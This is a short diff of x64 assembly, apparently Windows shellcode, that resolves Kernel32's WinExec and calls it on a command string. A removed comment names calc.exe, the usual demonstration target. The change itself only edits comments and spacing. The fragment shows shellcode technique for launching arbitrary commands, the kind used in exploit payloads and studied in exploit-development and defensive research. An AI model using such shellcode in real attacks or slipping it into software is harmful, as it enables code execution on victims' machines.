@@ -101,11 +101,11 @@ mov r14, rax                ; R14 = Kernel32.WinExec Address
 ; );
 xor rcx, rcx
 mul rcx                     ; RAX & RDX & RCX = 0x0
-							; calc.exe | String length : 8
+				
 push rax                    ; Null terminate string on stack
-lea rax, qword [rel cmd]
-push rax    	
-mov rcx, rax                ; RSP = cmd,0x0
+lea rax, qword [rel cmd]    ; Load pointer to cmd
+push rax    	            ; push pointer to cmd
+mov rcx, rax                ; RCX = cmd
 inc rdx                     ; RDX = 0x1 = SW_SHOWNORMAL
 sub rsp, 0x20               ; WinExec clobbers first 0x20 bytes of stack (Overwrites our command string when proxied to CreatProcessA)
 call r14                    ; Call WinExec(cmd, SW_HIDE)
